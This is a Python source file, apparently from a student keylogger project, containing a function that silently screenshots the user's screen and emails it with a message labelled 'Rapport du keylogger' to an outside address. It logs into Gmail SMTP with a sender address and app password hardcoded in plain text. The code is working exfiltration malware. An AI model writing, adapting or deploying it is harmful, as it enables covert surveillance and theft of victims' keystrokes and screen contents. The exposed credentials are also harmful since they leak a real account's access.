import smtplib
import ssl
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import pyautogui
import tempfile

def sendEmailWithScreenshot(message):
    smtp_server = "smtp.gmail.com"
    port = 587
    sender_email = "feriellamirem@gmail.com"
    password = "meun pqwy zjts gwqh"
    receiver_email = "feriel.lamirem@enicar.ucar.tn"

    context = ssl.create_default_context()

    screenshot = pyautogui.screenshot()
    screenshot_path = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
    screenshot.save(screenshot_path.name)

    try:
        server = smtplib.SMTP(smtp_server, port)
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()
        server.login(sender_email, password)

        message_content = message + "\n\nVeuillez trouver la capture d'écran en pièce jointe."

        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = receiver_email
        msg['Subject'] = "Rapport du keylogger avec capture d'écran"

        msg.attach(MIMEText(message_content, 'plain'))

        with open(screenshot_path.name, "rb") as file:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(file.read())
            encoders.encode_base64(part)
            part.add_header(
                'Content-Disposition',
                f'attachment; filename= {screenshot_path.name}',
            )
            msg.attach(part)

        server.send_message(msg)

    except Exception as e:
        print(e)
    finally:
        server.quit()
